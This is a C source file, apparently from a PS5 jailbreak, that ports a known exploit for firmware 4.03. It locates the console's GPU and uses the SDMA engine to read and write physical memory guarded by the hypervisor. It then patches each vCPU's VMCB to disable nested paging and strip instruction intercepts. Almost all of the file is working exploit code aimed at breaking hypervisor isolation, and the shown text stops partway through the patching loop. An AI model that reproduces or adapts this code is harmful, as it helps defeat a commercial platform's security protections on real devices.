/*
 * VMCB (Virtual Machine Control Block) patching via GPU SDMA.
 *
 * Ported from fail0verflow's prosperous exploit for PS5 FW 4.03,
 * using flatz's GPU method for accessing HV-protected memory.
 *
 * The PS5 hypervisor uses AMD SVM with nested paging to isolate
 * guest memory. The VMCB controls VM execution:
 *   - Instruction intercepts (offset 0x00-0x14)
 *   - Nested paging control (offset 0x90)
 *
 * Disabling NP and clearing intercepts gives the kernel direct
 * access to all physical memory without HV mediation.
 *
 * The x86 CPU cannot access VMCB physical addresses because the
 * HV's nested page tables (NPT) don't map them for the guest.
 * DMAP access causes #NPF → instant kernel panic.
 *
 * After TMR bypass (which enables all source access including GFX),
 * the GPU's SDMA engine can DMA-copy between any physical addresses.
 * The GPU goes through the IOMMU, completely bypassing x86 NPT.
 *
 * We use SDMA to copy VMCB data to/from accessible bounce buffers,
 * modify the data, and write it back.
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <ps5/kernel.h>
#include "prosperous.h"
#include "pci.h"

/* Number of vCPU contexts to patch */
#define MAX_VCPUS   16

/* vCPU context structure stride and VMCB pointer offset */
#define VCPU_CTX_SIZE       0x320
#define VCPU_CTX_VMCB_OFF   0x08

/* PCI for GPU discovery */
#define PCI_VENDOR_AMD_GPU  0x1002  /* ATI/AMD GPU vendor */
#define PCI_VENDOR_AMD_CPU  0x1022  /* AMD CPU/chipset vendor */
#define PCI_CLASS_GPU       0x03

/* SMN (System Management Network) access via PCI B0:D0:F0 */
#define SMN_INDEX_OFFSET    0x60
#define SMN_DATA_OFFSET     0x64

/* ================================================================
 * SDMA v5.2 register definitions (AMD RDNA2)
 *
 * Register offsets are dword-indexed from GPU BAR0.
 * Byte address = BAR0 + reg_offset * 4.
 * ================================================================ */

#define SDMA0_BASE                  0x4980

/* GFX ring buffer registers */
#define regSDMA0_GFX_RB_CNTL        (SDMA0_BASE + 0x80)
#define regSDMA0_GFX_RB_BASE        (SDMA0_BASE + 0x81)
#define regSDMA0_GFX_RB_BASE_HI     (SDMA0_BASE + 0x82)
#define regSDMA0_GFX_RB_RPTR        (SDMA0_BASE + 0x83)
#define regSDMA0_GFX_RB_RPTR_HI     (SDMA0_BASE + 0x84)
#define regSDMA0_GFX_RB_WPTR        (SDMA0_BASE + 0x85)
#define regSDMA0_GFX_RB_WPTR_HI     (SDMA0_BASE + 0x86)
#define regSDMA0_GFX_DOORBELL       (SDMA0_BASE + 0x92)

/* Status register */
#define regSDMA0_STATUS_REG         (SDMA0_BASE + 0x08)

/* SDMA opcodes */
#define SDMA_OP_NOP     0
#define SDMA_OP_COPY    1
#define SDMA_OP_WRITE   2
#define SDMA_OP_FENCE   5
#define SDMA_PKT_HDR(op, subop) (((op) & 0xFF) | (((subop) & 0xFF) << 8))

/* ================================================================
 * GPU state
 * ================================================================ */

static uint64_t g_gpu_bar0_pa;  /* GPU MMIO base (for reference only) */
static uint64_t g_dmap_base;    /* Kernel DMAP base VA */
static uint64_t g_proc_cr3;    /* Process page table root PA */

/* SDMA ring buffer state */
static uint64_t g_rb_pa;       /* Ring buffer physical address */
static uint32_t g_rb_size;     /* Ring buffer size in bytes */

/*
 * SMN address table for SDMA0 registers.
 * GPU BAR0 MMIO is NOT mapped in guest NPT — DMAP access panics.
 * We access SDMA registers via SMN (PCI B0:D0:F0 0x60/0x64) instead.
 *
 * Two candidate SMN address sets; gpu_find() probes both and sets
 * g_smn_sdma0_status to whichever responds.
 */
static uint32_t g_smn_sdma0_status;  /* SMN addr of SDMA0 STATUS */

/* Offsets from g_smn_sdma0_status for other SDMA0 registers.
 * These are identical for both v1 (0x12580) and v2 (0x13200) layouts. */
#define SMN_SDMA0_OFF_STATUS      0x00
#define SMN_SDMA0_OFF_RB_CNTL     0x80
#define SMN_SDMA0_OFF_RB_BASE     0x84
#define SMN_SDMA0_OFF_RB_BASE_HI  0x88
#define SMN_SDMA0_OFF_RB_RPTR     0x8C
#define SMN_SDMA0_OFF_RB_WPTR     0x94

/* ================================================================
 * Helpers
 * ================================================================ */

/* Forward declaration */
static uint32_t gpu_smn_read32(uint32_t addr);

/*
 * MMIO dword index → SMN address mapping for SDMA0 registers.
 * Returns 0 if the register is not in our table.
 */
static uint32_t sdma_reg_to_smn(uint32_t reg_idx)
{
    uint32_t off;
    if      (reg_idx == regSDMA0_STATUS_REG)    off = SMN_SDMA0_OFF_STATUS;
    else if (reg_idx == regSDMA0_GFX_RB_CNTL)   off = SMN_SDMA0_OFF_RB_CNTL;
    else if (reg_idx == regSDMA0_GFX_RB_BASE)    off = SMN_SDMA0_OFF_RB_BASE;
    else if (reg_idx == regSDMA0_GFX_RB_BASE_HI) off = SMN_SDMA0_OFF_RB_BASE_HI;
    else if (reg_idx == regSDMA0_GFX_RB_RPTR)    off = SMN_SDMA0_OFF_RB_RPTR;
    else if (reg_idx == regSDMA0_GFX_RB_WPTR)    off = SMN_SDMA0_OFF_RB_WPTR;
    else return 0;
    return g_smn_sdma0_status + off;
}

static uint32_t gpu_read32(uint32_t reg_idx)
{
    if (g_smn_sdma0_status) {
        uint32_t smn = sdma_reg_to_smn(reg_idx);
        if (smn) return gpu_smn_read32(smn);
    }

    /* MMIO via DMAP — works on 4.03 where NPT maps GPU BAR0 */
    uint32_t val = 0;
    kernel_copyout(g_dmap_base + g_gpu_bar0_pa + (uint64_t)reg_idx * 4,
                   &val, sizeof(val));
    return val;
}

static void gpu_write32(uint32_t reg_idx, uint32_t val)
{
    if (g_smn_sdma0_status) {
        uint32_t smn = sdma_reg_to_smn(reg_idx);
        if (smn) {
            uint64_t idx_kva = g_dmap_base + PCI_B0D0F0 + SMN_INDEX_OFFSET;
            uint64_t dat_kva = g_dmap_base + PCI_B0D0F0 + SMN_DATA_OFFSET;
            kernel_copyin(&smn, idx_kva, 4);
            kernel_copyin(&val, dat_kva, 4);
            return;
        }
    }

    /* MMIO via DMAP */
    kernel_copyin(&val, g_dmap_base + g_gpu_bar0_pa + (uint64_t)reg_idx * 4,
                  sizeof(val));
}

/*
 * Translate userspace VA to physical address via guest page table walk.
 */
static uint64_t va_to_pa(uint64_t va)
{
    uint64_t paddr = g_proc_cr3;
    int levels_from[] = {39, 30, 21, 12};
    int levels_to[]   = {47, 38, 29, 20};
    uint64_t level_size[] = {1ULL << 39, 1ULL << 30, 1ULL << 21, 1ULL << 12};

    for (int i = 0; i < 4; i++) {
        uint64_t pd[512];
        kernel_copyout(g_dmap_base + paddr, pd, sizeof(pd));

        uint64_t idx = (va >> levels_from[i]) &
                       ((1ULL << (levels_to[i] - levels_from[i] + 1)) - 1);
        uint64_t pde = pd[idx];

        if (!(pde & 1))
            return 0;

        paddr = pde & 0xFFFFFFFFF000ULL;

        if ((pde & (1ULL << 7)) || i == 3)
            return paddr | (va & (level_size[i] - 1));
    }
    return 0;
}

/* ================================================================
 * GPU discovery
 * ================================================================ */

/*
 * SMN read/write for GPU discovery (via PCI B0:D0:F0 index/data).
 */
static uint32_t gpu_smn_read32(uint32_t addr)
{
    uint64_t idx_kva = g_dmap_base + PCI_B0D0F0 + SMN_INDEX_OFFSET;
    uint64_t dat_kva = g_dmap_base + PCI_B0D0F0 + SMN_DATA_OFFSET;
    uint32_t val;
    kernel_copyin(&addr, idx_kva, 4);
    kernel_copyout(dat_kva, &val, 4);
    return val;
}

/*
 * Read 64-bit BAR from PCI config space (handles 32-bit and 64-bit BARs).
 */
static uint64_t pci_read_bar(uint64_t cfg_pa, int bar_idx)
{
    uint32_t lo = 0, hi = 0;
    kernel_copyout(g_dmap_base + cfg_pa + 0x10 + bar_idx * 4, &lo, 4);
    if ((lo & 0x6) == 0x4)  /* 64-bit BAR */
        kernel_copyout(g_dmap_base + cfg_pa + 0x14 + bar_idx * 4, &hi, 4);
    return ((uint64_t)hi << 32) | (lo & ~0xFULL);
}

static int gpu_find(void)
{
    printf("[GPU] Scanning for AMD GPU...\n");

    /* === Strategy 1: Check bridge 00:01.1 (GFX bridge on Zen 2 APUs) === */
    {
        uint64_t bridge_cfg = pci_cfg_addr(0, 1, 1, 0);
        uint32_t bridge_id = 0;
        kernel_copyout(g_dmap_base + bridge_cfg, &bridge_id, 4);

        if ((bridge_id & 0xFFFF) != 0 && (bridge_id & 0xFFFF) != 0xFFFF) {
            /* Read secondary bus number (offset 0x19) */
            uint32_t bus_nums = 0;
            kernel_copyout(g_dmap_base + bridge_cfg + 0x18, &bus_nums, 4);
            uint8_t sec_bus = (bus_nums >> 8) & 0xFF;
            uint8_t sub_bus = (bus_nums >> 16) & 0xFF;

            printf("[GPU] Bridge 00:01.1 (dev=0x%04x): sec_bus=%d sub_bus=%d\n",
                   bridge_id >> 16, sec_bus, sub_bus);

            /* Scan the secondary bus for GPU (class 0x03) */
            if (sec_bus > 0) {
                for (int dev = 0; dev < 32; dev++) {
                    for (int fn = 0; fn < 8; fn++) {
                        uint64_t cfg = pci_cfg_addr(sec_bus, dev, fn, 0);
                        uint32_t id = 0;
                        kernel_copyout(g_dmap_base + cfg, &id, 4);
                        if ((id & 0xFFFF) == 0 || (id & 0xFFFF) == 0xFFFF) continue;

                        uint32_t cr = 0;
                        kernel_copyout(g_dmap_base + cfg + 0x08, &cr, 4);
                        uint8_t base_class = (cr >> 24) & 0xFF;
                        printf("[GPU] PCI %d:%02d.%d %04x:%04x class=%02x/%02x\n",
                               sec_bus, dev, fn, id & 0xFFFF, id >> 16,
                               base_class, (cr >> 16) & 0xFF);

                        /* Log BARs — skip 64-bit BAR high dwords */
                        for (int bar = 0; bar < 6; bar++) {
                            uint32_t bv = 0;
                            kernel_copyout(g_dmap_base + cfg + 0x10 + bar * 4, &bv, 4);
                            if (bv != 0 && bv != 0xFFFFFFFF) {
                                printf("[GPU]   BAR%d raw=0x%08x\n", bar, bv);
                                if ((bv & 0x6) == 0x4) bar++; /* skip hi dword */
                            }
                        }

                        if (base_class == PCI_CLASS_GPU) {
                            g_gpu_bar0_pa = pci_read_bar(cfg, 0);
                            printf("[GPU] Found GPU! BAR0=0x%llx\n",
                                   (unsigned long long)g_gpu_bar0_pa);
                            return 0;
                        }

                        /* Only check fn>0 if device is multi-function */
                        if (fn == 0) {
                            uint32_t hdr = 0;
                            kernel_copyout(g_dmap_base + cfg + 0x0C, &hdr, 4);
                            if (!((hdr >> 16) & 0x80)) break;
                        }
                    }
                }
            }
        }
    }

    /* === Strategy 2: Check bridge 00:08.1 (Internal GPP bridge) === */
    {
        uint64_t bridge_cfg = pci_cfg_addr(0, 8, 1, 0);
        uint32_t bridge_id = 0;
        kernel_copyout(g_dmap_base + bridge_cfg, &bridge_id, 4);

        if ((bridge_id & 0xFFFF) != 0 && (bridge_id & 0xFFFF) != 0xFFFF) {
            uint32_t bus_nums = 0;
            kernel_copyout(g_dmap_base + bridge_cfg + 0x18, &bus_nums, 4);
            uint8_t sec_bus = (bus_nums >> 8) & 0xFF;
            uint8_t sub_bus = (bus_nums >> 16) & 0xFF;

            printf("[GPU] Bridge 00:08.1 (dev=0x%04x): sec_bus=%d sub_bus=%d\n",
                   bridge_id >> 16, sec_bus, sub_bus);

            if (sec_bus > 0) {
                for (int dev = 0; dev < 32; dev++) {
                    for (int fn = 0; fn < 8; fn++) {
                        uint64_t cfg = pci_cfg_addr(sec_bus, dev, fn, 0);
                        uint32_t id = 0;
                        kernel_copyout(g_dmap_base + cfg, &id, 4);
                        if ((id & 0xFFFF) == 0 || (id & 0xFFFF) == 0xFFFF) continue;

                        uint32_t cr = 0;
                        kernel_copyout(g_dmap_base + cfg + 0x08, &cr, 4);
                        uint8_t base_class = (cr >> 24) & 0xFF;
                        printf("[GPU] PCI %d:%02d.%d %04x:%04x class=%02x/%02x\n",
                               sec_bus, dev, fn, id & 0xFFFF, id >> 16,
                               base_class, (cr >> 16) & 0xFF);

                        for (int bar = 0; bar < 6; bar++) {
                            uint32_t bv = 0;
                            kernel_copyout(g_dmap_base + cfg + 0x10 + bar * 4, &bv, 4);
                            if (bv != 0 && bv != 0xFFFFFFFF) {
                                printf("[GPU]   BAR%d raw=0x%08x\n", bar, bv);
                                if ((bv & 0x6) == 0x4) bar++; /* skip hi dword */
                            }
                        }

                        if (base_class == PCI_CLASS_GPU) {
                            g_gpu_bar0_pa = pci_read_bar(cfg, 0);
                            printf("[GPU] Found GPU! BAR0=0x%llx\n",
                                   (unsigned long long)g_gpu_bar0_pa);
                            return 0;
                        }

                        if (fn == 0) {
                            uint32_t hdr = 0;
                            kernel_copyout(g_dmap_base + cfg + 0x0C, &hdr, 4);
                            if (!((hdr >> 16) & 0x80)) break;
                        }
                    }
                }
            }
        }
    }

    /* === Strategy 3: Read GPU registers via SMN ===
     *
     * On PS5's Oberon APU, the GPU is tightly integrated and may not
     * appear as a standard PCI device. GPU registers are accessible
     * via SMN (System Management Network) at known base addresses.
     *
     * Key insight: We don't necessarily need BAR0 PA. If we can access
     * GPU SDMA registers directly via SMN, we can skip BAR0 entirely.
     * The SDMA engine on RDNA2 has SMN addresses in the 0x00012xxx-0x00013xxx
     * range, and GC (Graphics Core) in the 0x00028xxx range.
     *
     * Also probe NBIO BIF for BAR configuration.
     */
    printf("[GPU] Probing GPU registers via SMN...\n");
    {
        struct { uint32_t smn_addr; const char *name; } smn_regs[] = {
            /* NBIO BIF - BAR configuration */
            { 0x00100010, "BIF_BX0_PCIE_BAR0_CNTL" },
            { 0x00100020, "BIF_BX0_PCIE_BAR0_ADDR_LO" },
            { 0x00100024, "BIF_BX0_PCIE_BAR0_ADDR_HI" },
            { 0x000100A0, "BIF_BX0_GPU_HDP_FLUSH_REQ" },
            { 0x000100A4, "BIF_BX0_GPU_HDP_FLUSH_DONE" },
            /* NBIO BIF - device ID / revision */
            { 0x00100000, "BIF_BX0_PCIE_VENDOR_ID" },
            { 0x00100008, "BIF_BX0_PCIE_REV_CLASS" },
            /* GC (Graphics Core) block via SMN */
            { 0x00028000, "GC_GRBM_STATUS" },
            { 0x00028004, "GC_GRBM_STATUS_SE0" },
            { 0x00028008, "GC_GRBM_STATUS2" },
            { 0x00028040, "GC_GRBM_STATUS_SE1" },
            /* GPU identity registers */
            { 0x0000A000, "GPU_HW_ID" },
            { 0x0000D000, "GC_CAC_ID" },
            { 0x00030000, "GC_CONFIG" },
            /* SDMA0 via SMN (Navi1x/2x known offsets) */
            { 0x00012400, "SDMA0_UCODE_ADDR" },
            { 0x00012404, "SDMA0_UCODE_DATA" },
            { 0x00012580, "SDMA0_STATUS_REG (SMN)" },
            { 0x00012600, "SDMA0_GFX_RB_CNTL (SMN)" },
            { 0x00012604, "SDMA0_GFX_RB_BASE (SMN)" },
            { 0x00012608, "SDMA0_GFX_RB_BASE_HI (SMN)" },
            { 0x0001260C, "SDMA0_GFX_RB_RPTR (SMN)" },
            { 0x00012614, "SDMA0_GFX_RB_WPTR (SMN)" },
            /* SDMA0 alternate offsets (Navi2x shifted) */
            { 0x00013200, "SDMA0_v2_STATUS_REG" },
            { 0x00013280, "SDMA0_v2_GFX_RB_CNTL" },
            { 0x00013284, "SDMA0_v2_GFX_RB_BASE" },
            { 0x00013288, "SDMA0_v2_GFX_RB_BASE_HI" },
            { 0x0001328C, "SDMA0_v2_GFX_RB_RPTR" },
            { 0x00013294, "SDMA0_v2_GFX_RB_WPTR" },
            /* MMHUB - memory controller hub (BAR aperture config) */
            { 0x0003A000, "MMHUB_VM_FB_LOCATION_BASE" },
            { 0x0003A004, "MMHUB_VM_FB_LOCATION_TOP" },
            { 0x0003A010, "MMHUB_VM_FB_OFFSET" },
            /* NBIO doorbell aperture */
            { 0x000100C0, "BIF_BX0_DOORBELL_RANGE" },
            { 0x000100C8, "BIF_BX0_DOORBELL_CTRL" },
        };

        for (int i = 0; i < (int)(sizeof(smn_regs)/sizeof(smn_regs[0])); i++) {
            uint32_t val = gpu_smn_read32(smn_regs[i].smn_addr);
            if (val != 0 && val != 0xFFFFFFFF)
                printf("[SMN] 0x%08x (%s) = 0x%08x\n",
                       smn_regs[i].smn_addr, smn_regs[i].name, val);
        }

        /* Check BIF vendor/class to confirm GPU is present */
        uint32_t bif_id = gpu_smn_read32(0x00100000);
        uint32_t bif_class = gpu_smn_read32(0x00100008);
        printf("[SMN] BIF vendor:device = %04x:%04x  class = %08x\n",
               bif_id & 0xFFFF, bif_id >> 16, bif_class);

        /* Try to reconstruct BAR0 from BIF registers */
        uint32_t bar0_lo = gpu_smn_read32(0x00100020);
        uint32_t bar0_hi = gpu_smn_read32(0x00100024);
        uint64_t bar0 = ((uint64_t)bar0_hi << 32) | (bar0_lo & ~0xFULL);
        if (bar0 != 0 && bar0 != 0xFFFFFFFFFFFFFFFFULL) {
            printf("[GPU] BAR0 from NBIO BIF: 0x%llx\n",
                   (unsigned long long)bar0);
            g_gpu_bar0_pa = bar0;
            return 0;
        }

        /* Check if GRBM is accessible via SMN — if so, the GPU is alive
         * and we can potentially use SMN-based SDMA access instead of MMIO */
        uint32_t grbm = gpu_smn_read32(0x00028000);
        if (grbm != 0 && grbm != 0xFFFFFFFF) {
            printf("[GPU] GRBM_STATUS via SMN: 0x%08x — GPU is alive!\n", grbm);
            /* We'll try SMN-based SDMA access below */
        }
    }

    /* === Strategy 4: Scan physical memory for GPU GRBM signature ===
     *
     * GPU MMIO on AMD APUs is typically at a physical address in the
     * 0x13000000-0x15000000 range. GRBM_STATUS at dword offset 0x8010
     * (byte offset 0x20040) should have recognizable bit patterns
     * (GUI_ACTIVE, SE busy bits, etc.).
     */
    printf("[GPU] Scanning candidate PAs for GPU MMIO registers...\n");
    {
        uint64_t candidates[] = {
            0x13000000ULL, 0x13100000ULL, 0x13200000ULL,
            0x13300000ULL, 0x13400000ULL, 0x13500000ULL,
            0x13800000ULL, 0x13900000ULL, 0x13A00000ULL,
            0x14000000ULL, 0x15000000ULL, 0x16000000ULL,
            0xE0000000ULL, 0xE0100000ULL, 0xE0200000ULL,
            0xE0300000ULL, 0xE0400000ULL, 0xE0500000ULL,
        };

        for (int i = 0; i < (int)(sizeof(candidates)/sizeof(candidates[0])); i++) {
            uint64_t base = candidates[i];
            uint32_t grbm = 0;
            /* GRBM_STATUS2 at dword offset 0x8008, byte offset 0x20020 */
            kernel_copyout(g_dmap_base + base + 0x20020, &grbm, 4);

            /* GRBM_CHIP_REV at dword offset 0x8000, byte offset 0x20000 */
            uint32_t chip_rev = 0;
            kernel_copyout(g_dmap_base + base + 0x20000, &chip_rev, 4);

            if (grbm != 0 && grbm != 0xFFFFFFFF &&
                chip_rev != 0 && chip_rev != 0xFFFFFFFF) {
                printf("[GPU] Candidate 0x%llx: GRBM_STATUS2=0x%08x "
                       "CHIP_REV=0x%08x\n",
                       (unsigned long long)base, grbm, chip_rev);
                g_gpu_bar0_pa = base;
                printf("[GPU] Using GPU MMIO base = 0x%llx\n",
                       (unsigned long long)g_gpu_bar0_pa);
                return 0;
            }
        }
    }

    printf("[!] GPU: All PCI/MMIO discovery methods failed\n");
    printf("[!] GPU: Will need SMN-based SDMA access (see SMN dump above)\n");
    return -1;
}

/* ================================================================
 * SDMA engine interface
 * ================================================================ */

/*
 * Initialize SDMA by reading current ring buffer configuration.
 * The kernel/driver has already set up the SDMA engine — we
 * piggyback on the existing ring buffer.
 */
static int sdma_init(void)
{
    uint32_t status = gpu_read32(regSDMA0_STATUS_REG);
    uint32_t rb_cntl = gpu_read32(regSDMA0_GFX_RB_CNTL);
    uint32_t rb_base_lo = gpu_read32(regSDMA0_GFX_RB_BASE);
    uint32_t rb_base_hi = gpu_read32(regSDMA0_GFX_RB_BASE_HI);
    uint32_t rb_rptr = gpu_read32(regSDMA0_GFX_RB_RPTR);
    uint32_t rb_wptr = gpu_read32(regSDMA0_GFX_RB_WPTR);

    g_rb_pa = ((uint64_t)rb_base_hi << 32) | ((uint64_t)rb_base_lo << 8);
    g_rb_size = 1 << (((rb_cntl >> 1) & 0x1F) + 1);

    printf("[SDMA] status=0x%08x cntl=0x%08x\n", status, rb_cntl);
    printf("[SDMA] ring PA=0x%llx size=%u bytes\n",
           (unsigned long long)g_rb_pa, g_rb_size);
    printf("[SDMA] rptr=0x%x wptr=0x%x\n", rb_rptr, rb_wptr);

    if (g_rb_pa == 0 || g_rb_size == 0) {
        printf("[!] SDMA: Ring buffer not initialized by driver\n");
        return -1;
    }

    return 0;
}

/*
 * Submit an SDMA copy command: src_pa → dst_pa, len bytes.
 * Appends copy + fence to the ring buffer, advances wptr,
 * and waits for the fence to complete.
 *
 * bounce_pa + 0x800 is used as the fence address.
 * The caller must ensure bounce_pa points to a mapped+writable page.
 */
static int sdma_copy(uint64_t src_pa, uint64_t dst_pa, uint32_t len,
                     volatile uint32_t *fence_va, uint64_t fence_pa)
{
    /* Build SDMA packets */
    uint32_t cmd[16];
    int n = 0;

    /* Linear copy: 6 DWORDs */
    cmd[n++] = SDMA_PKT_HDR(SDMA_OP_COPY, 0);
    cmd[n++] = (len - 1) & 0x3FFFFF;
    cmd[n++] = (uint32_t)(src_pa & 0xFFFFFFFF);
    cmd[n++] = (uint32_t)(src_pa >> 32);
    cmd[n++] = (uint32_t)(dst_pa & 0xFFFFFFFF);
    cmd[n++] = (uint32_t)(dst_pa >> 32);

    /* Fence: 4 DWORDs */
    cmd[n++] = SDMA_PKT_HDR(SDMA_OP_FENCE, 0);
    cmd[n++] = (uint32_t)(fence_pa & 0xFFFFFFFF);
    cmd[n++] = (uint32_t)(fence_pa >> 32);
    cmd[n++] = 0xCAFEDEAD;

    /* Clear fence */
    *fence_va = 0;

    /* Read current wptr */
    uint32_t wptr = gpu_read32(regSDMA0_GFX_RB_WPTR);

    /* Check if there's enough space in the ring */
    uint32_t wptr_bytes = wptr * 4;
    if (wptr_bytes + n * 4 > g_rb_size) {
        /* Wrap: pad with NOPs to end, then write at beginning */
        uint32_t nop = SDMA_PKT_HDR(SDMA_OP_NOP, 0);
        while (wptr_bytes + 4 <= g_rb_size) {
            kernel_copyin(&nop, g_dmap_base + g_rb_pa + wptr_bytes, 4);
            wptr_bytes += 4;
        }
        wptr = 0;
        wptr_bytes = 0;
    }

    /* Write command to ring buffer */
    kernel_copyin(cmd, g_dmap_base + g_rb_pa + (uint64_t)wptr * 4, n * 4);

    /* Advance write pointer */
    uint32_t new_wptr = wptr + n;
    gpu_write32(regSDMA0_GFX_RB_WPTR, new_wptr);

    /* Wait for fence completion */
    for (int timeout = 0; timeout < 2000000; timeout++) {
        if (*fence_va == 0xCAFEDEAD)
            return 0;
    }

    /* Timeout — dump SDMA state for diagnosis */
    uint32_t new_rptr = gpu_read32(regSDMA0_GFX_RB_RPTR);
    uint32_t new_status = gpu_read32(regSDMA0_STATUS_REG);
    printf("[!] SDMA timeout: fence=0x%08x rptr=0x%x->0x%x status=0x%08x\n",
           *fence_va, wptr, new_rptr, new_status);
    return -1;
}

/* ================================================================
 * Physical memory read/write via GPU SDMA
 *
 * Uses a bounce buffer page:
 *   [0x000-0x7FF] data area (up to 2048 bytes)
 *   [0x800]       fence DWORD
 * ================================================================ */

struct sdma_bounce {
    void *va;                   /* mmap'd bounce buffer */
    uint64_t pa;                /* physical address */
    volatile uint32_t *fence;   /* fence VA (bounce + 0x800) */
    uint64_t fence_pa;          /* fence PA */
};

static int bounce_init(struct sdma_bounce *b)
{
    b->va = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (b->va == MAP_FAILED) return -1;

    /* Touch page to ensure it's faulted in */
    memset(b->va, 0, 4096);

    b->pa = va_to_pa((uint64_t)b->va);
    if (b->pa == 0) {
        munmap(b->va, 4096);
        return -2;
    }

    b->fence = (volatile uint32_t *)((uint8_t *)b->va + 0x800);
    b->fence_pa = b->pa + 0x800;
    return 0;
}

static void bounce_free(struct sdma_bounce *b)
{
    if (b->va && b->va != MAP_FAILED)
        munmap(b->va, 4096);
    b->va = NULL;
}

/*
 * Read `len` bytes from physical address `src_pa` into `dst`.
 * Uses SDMA to copy src_pa → bounce_pa, then memcpy bounce → dst.
 */
static int sdma_read_phys(struct sdma_bounce *b,
                          uint64_t src_pa, void *dst, uint32_t len)
{
    if (len > 2048) return -1;
    memset(b->va, 0, len);

    int ret = sdma_copy(src_pa, b->pa, len, b->fence, b->fence_pa);
    if (ret != 0) return ret;

    memcpy(dst, b->va, len);
    return 0;
}

/*
 * Write `len` bytes from `src` to physical address `dst_pa`.
 * Copies src → bounce buffer, then SDMA bounce_pa → dst_pa.
 */
static int sdma_write_phys(struct sdma_bounce *b,
                           const void *src, uint64_t dst_pa, uint32_t len)
{
    if (len > 2048) return -1;
    memcpy(b->va, src, len);

    return sdma_copy(b->pa, dst_pa, len, b->fence, b->fence_pa);
}

/* ================================================================
 * VMCB patching
 * ================================================================ */

int vmcb_patch_disable_np(struct phys_rw_ctx *ctx)
{
    uint64_t vcpu_ctxs_pa = VCPU_CTXS_PA;
    int ret;
    int patched = 0;

    g_dmap_base = ctx->dmap_base;
    g_proc_cr3 = ctx->proc_cr3;

    printf("[VMCB] === GPU SDMA VMCB Patching ===\n");
    printf("[VMCB] VCPU contexts at system PA 0x%llx\n",
           (unsigned long long)vcpu_ctxs_pa);

    /* Step 1: Find GPU */
    ret = gpu_find();
    if (ret != 0) return ret;

    /* Step 1b: Probe SMN for SDMA0 register access.
     * GPU BAR0 MMIO is NOT mapped in guest NPT, so we must use SMN. */
    {
        uint32_t smn_bases[] = { 0x00012580, 0x00013200 };
        const char *smn_names[] = { "v1(0x12580)", "v2(0x13200)" };
        g_smn_sdma0_status = 0;
        for (int i = 0; i < 2; i++) {
            uint32_t rb_cntl = gpu_smn_read32(smn_bases[i] + SMN_SDMA0_OFF_RB_CNTL);
            printf("[SMN] SDMA0 %s RB_CNTL=0x%08x\n", smn_names[i], rb_cntl);
            if (rb_cntl != 0 && rb_cntl != 0xFFFFFFFF) {
                g_smn_sdma0_status = smn_bases[i];
                printf("[GPU] Using SMN SDMA0 base: %s\n", smn_names[i]);
                break;
            }
        }
        if (g_smn_sdma0_status == 0) {
            printf("[GPU] No working SMN SDMA0 found — will use MMIO via BAR0\n");
            if (g_gpu_bar0_pa == 0) {
                printf("[!] No SMN SDMA0 and no BAR0 — cannot access SDMA\n");
                return -1;
            }
        }
    }

    /* Step 2: Initialize SDMA */
    ret = sdma_init();
    if (ret != 0) return ret;

    /* Step 3: Allocate bounce buffer */
    struct sdma_bounce bounce;
    ret = bounce_init(&bounce);
    if (ret != 0) {
        printf("[!] VMCB: Bounce buffer init failed: %d\n", ret);
        return ret;
    }
    printf("[VMCB] Bounce buffer: VA=%p PA=0x%llx\n",
           bounce.va, (unsigned long long)bounce.pa);

    /* Step 4: Test SDMA with a read from HV data area.
     * First qword at PA 0x62848000 = HV virtual address base. */
    printf("[VMCB] Testing SDMA read from HV PA 0x62848000...\n");

    uint64_t hv_va_base = 0;
    ret = sdma_read_phys(&bounce, 0x62848000ULL, &hv_va_base, 8);
    if (ret != 0) {
        printf("[!] VMCB: SDMA test read failed: %d\n", ret);
        bounce_free(&bounce);
        return ret;
    }

    printf("[VMCB] HV VA base: 0x%llx\n", (unsigned long long)hv_va_base);

    if (hv_va_base == 0 || hv_va_base == 0xFFFFFFFFFFFFFFFFULL) {
        printf("[!] VMCB: Invalid HV VA base — TMR not bypassed?\n");
        bounce_free(&bounce);
        return -1;
    }

    /* Step 5: Patch each vCPU's VMCB */
    for (int i = 0; i < MAX_VCPUS; i++) {
        uint64_t ctx_pa = vcpu_ctxs_pa + VCPU_CTX_SIZE * i + VCPU_CTX_VMCB_OFF;

        /* Read VMCB virtual address from vCPU context */
        uint64_t vmcb_va = 0;
        ret = sdma_read_phys(&bounce, ctx_pa, &vmcb_va, 8);
        if (ret != 0 || vmcb_va == 0) continue;

        /* Convert HV VA to system PA */
        uint64_t vmcb_pa = vmcb_va - hv_va_base;

        /* Read NP_CTRL (offset 0x90 in VMCB) */
        uint64_t np_ctrl = 0;
        ret = sdma_read_phys(&bounce, vmcb_pa + VMCB_NP_CTRL, &np_ctrl, 8);
        if (ret != 0) continue;

        /* If already zero, VMCBs were previously modified */
        if (np_ctrl == 0) break;

        /* Sanity check: NP_CTRL should be 0x09 */
        if ((np_ctrl & 0xFF) != 0x09) {
            printf("[!] VMCB %d: unexpected NP_CTRL=0x%llx\n",
                   i, (unsigned long long)np_ctrl);
            bounce_free(&bounce);
            return -1;
        }

        /* Read the first 0x14 bytes of VMCB control area (intercept vectors) */
        uint8_t ctrl_buf[0x14];
        memset(ctrl_buf, 0, sizeof(ctrl_buf));
        ret = sdma_read_phys(&bounce, vmcb_pa, ctrl_buf, 0x14);
        if (ret != 0) {
            printf("[!] VMCB %d: intercept read failed\n", i);
            continue;
        }

        uint32_t *vec0 = (uint32_t *)(ctrl_buf + VMCB_INTERCEPT_VEC0);
        uint32_t *vec3 = (uint32_t *)(ctrl_buf + VMCB_INTERCEPT_VEC3);
        uint32_t *vec4 = (uint32_t *)(ctrl_buf + VMCB_INTERCEPT_VEC4);

        uint32_t orig_vec3 = *vec3;
        uint32_t cpuid_intercept = orig_vec3 & (1 << 18);

        /* Patch: disable NP */
        uint64_t zero = 0;
        ret = sdma_write_phys(&bounce, &zero, vmcb_pa + VMCB_NP_CTRL, 8);
        if (ret != 0) {
            printf("[!] VMCB %d: NP write failed\n", i);
            continue;
        }

        /* Patch intercepts */
        *vec0 = 0;                  /* Clear all CR/DR intercepts */
        *vec3 = cpuid_intercept;    /* Keep only CPUID intercept */
        *vec4 = 0x0F;              /* Keep VMSAVE/VMLOAD/VMMCALL/VMRUN */

        ret = sdma_write_phys(&bounce, ctrl_buf, vmcb_pa, 0x14);
        if (ret != 0) {
            printf("[!] VMCB %d: intercept write failed\n", i);
            continue;
        }

